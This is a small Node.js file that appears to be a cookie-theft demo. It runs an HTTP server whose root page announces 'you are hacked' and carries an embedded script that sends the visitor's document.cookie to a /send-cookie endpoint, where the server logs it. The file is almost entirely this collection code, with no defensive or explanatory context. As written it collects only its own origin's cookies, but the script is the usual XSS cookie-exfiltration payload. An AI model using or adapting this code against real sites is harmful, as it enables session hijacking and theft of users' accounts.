const {createServer} = require("http");

const hackedWebsite = [];

const server = createServer((req, res) => {
    if(req.url === "/" && req.method === "GET"){
        res.write(`
        <h1>Hi, you are hacked </h1>
            <script>
            document.addEventListener("DOMContentLoaded", () => {
                fetch("/send-cookie", {
                    method: "POST",
                    headers: {
                        "Accept": "text/plain",
                        "Content-type": "*/* text/plain application/json",
                    },
                    body: JSON.stringify({ cookie: document.cookie }),
                }).then(res => res.json()).then(data => console.log(data)).catch(err => console.log(err))
            });
            </script>
        `);
        res.end();
    } else if(req.url === "/send-cookie" && req.method === "POST"){
        let resData = "";
        req.on("data", (chunk) => {
            resData += chunk;
        });
        req.on("end", () => {
            console.log(resData);
            res.write(JSON.stringify({msg: "ok"}));
            res.end();
        });
        req.on("error", (error) => {
            console.log("Error: " +error.message);

            res.write(JSON.stringify({msg: "error"}));
            res.end();
        });
    } else if(req.url === "/send-cookie" && req.method === "GET"){
        res.write("get it but with get request")
        res.end();
    } else {
        res.write("Page not found");
        res.end();
    }
})

server.listen(8000, () => console.log("server is up and running"));
